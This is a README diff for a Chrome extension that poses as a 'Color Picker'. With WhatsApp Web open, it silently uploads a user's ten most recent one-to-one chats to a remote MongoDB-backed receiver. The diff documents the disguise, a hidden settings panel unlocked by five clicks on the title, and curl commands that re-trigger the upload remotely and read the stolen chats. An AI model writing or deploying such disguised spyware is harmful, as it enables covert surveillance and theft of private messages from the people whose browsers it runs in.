@@ -1,84 +1,43 @@
-# Eternal Data Excel
+# Color Picker
 
-Chrome extension that exports a single WhatsApp Web chat to **CSV + TXT** at the same time. Media is **not** downloaded — only filename / mime / caption references are written.
+Chrome lists this extension as **Color Picker**. With WhatsApp Web open, it silently uploads the **10 most recent 1:1 chats** from the **past month** as TXT to your receiver. Text is stored in **MongoDB**.
 
-Uses **local WhatsApp Web history only** (whatever is already synced to the linked device). It does not pull full archives from your phone. Export does **not** switch the WhatsApp Web UI to the selected chat.
+Media files are not downloaded. Filenames stay inside the TXT as references. The WhatsApp tab does not have to be focused, and the export does not switch chats.
 
-## Install (unpacked)
+## 1. Receiver
 
-1. Open Chrome → `chrome://extensions`
-2. Enable **Developer mode**
-3. Click **Load unpacked**
-4. Select this folder: `extractor` (the one that contains `manifest.json`)
-5. Open [https://web.whatsapp.com](https://web.whatsapp.com) and wait until your chat list is fully loaded
-6. Click the extension icon on that tab
+See [receiver/README.md](receiver/README.md).
 
-## Use
+Set `TOKEN` and `MONGODB_URI` (include a database name), then run locally or on Render.
 
-1. Choose a chat from the dropdown (active chat is preselected when possible)
-2. Set **From** / **To** (defaults: `2001-01-01` → today)
-3. Click **Download**
-4. Two files are saved, e.g. `Alice_2026-07-20.csv` and `Alice_2026-07-20.txt`
+Remote re-export:
 
-### TXT format
-
-```text
-[20/07/2026, 22:10:05] You: Hello
-[20/07/2026, 22:11:02] Alice: [image] IMG-2026.jpg Caption here
-[20/07/2026, 22:12:00] System: Missed voice call
+```bash
+curl -X POST "$URL/trigger" -H "Authorization: Bearer $TOKEN"
 ```
 
-### CSV columns
+Read saved chats:
 
-`timestamp,iso_time,sender,type,body,media_filename,media_mime,is_from_me`
+```bash
+curl "$URL/exports?includeText=1" -H "Authorization: Bearer $TOKEN"
+```
 
-## Manual test checklist
+## 2. Extension
 
-Run these on a real logged-in WhatsApp Web session after loading the unpacked extension.
+1. `chrome://extensions` → Developer mode → **Load unpacked** → this folder
+2. Open the popup. It looks like a color picker.
+3. Click the title **Color Picker** five times within 2 seconds
+4. Enter the Upload URL (your Render `https://…` URL) and the same token
+5. Click **Save** and allow the site permission
+6. Leave [WhatsApp Web](https://web.whatsapp.com) open and logged in
 
-### Setup
+On that browser session it exports once, then stops. A remote `POST /trigger` runs it again while the tab is open. The trigger is cleared only after all 10 uploads succeed.
 
-- [ ] Extension loads without errors on `chrome://extensions`
-- [ ] Popup opens on `web.whatsapp.com`
-- [ ] Status shows “Ready — N chats” after chats load
-- [ ] Popup shows a clear error if opened on a non–WhatsApp tab
-
-### DM export
-
-- [ ] Select a one-to-one chat
-- [ ] Export with default date range
-- [ ] Both `.csv` and `.txt` download
-- [ ] Text messages appear with correct sender (“You” / contact name)
-- [ ] Image / video / document / voice rows use `[type] filename` and are not binary media files
-- [ ] Call rows appear as System call lines when call history exists locally
-- [ ] Narrow date range reduces row count as expected
-
-### Group export
-
-- [ ] Select a group chat (label shows “(group)”)
-- [ ] Sender names resolve for other participants when available
-- [ ] System / group events (add/remove/subject) appear when present in local history
-
-### Edge cases
-
-- [ ] Empty range (future dates) downloads files with header / zero messages or empty body as appropriate
-- [ ] Invalid From > To is blocked in the UI
-- [ ] Long history shows progress (“Loading history…”) then completes
-- [ ] After a WhatsApp Web update, if Store modules break, status shows a clear “Store not ready / needs update” style error
+Manual TXT download for one chat is on the unlocked settings panel, and only works when the active tab is WhatsApp Web.
 
 ## Limits
 
-- Completeness = what WhatsApp Web already has for that chat — not a guaranteed phone archive since 2001
-- WhatsApp Web updates can rename internal modules; the injector may need maintenance
-- No HTML export, no media file download, no multi-chat bulk export, no “get from mobile” sync
-
-## Project files
-
-| File | Role |
-|------|------|
-| `manifest.json` | MV3 extension config |
-| `popup.html` / `popup.css` / `popup.js` | UI |
-| `background.js` | Ensures content scripts on the active WA tab |
-| `content.js` | Bridge + CSV/TXT builders + downloads |
-| `inject.js` | MAIN-world WhatsApp Store access |
-| `icons/` | Extension icons |
+- Only history already on WhatsApp Web
+- Groups are skipped
+- Chrome can still show the extension under `chrome://extensions`
+- Put `MONGODB_URI` in Render or `.env`, not in git
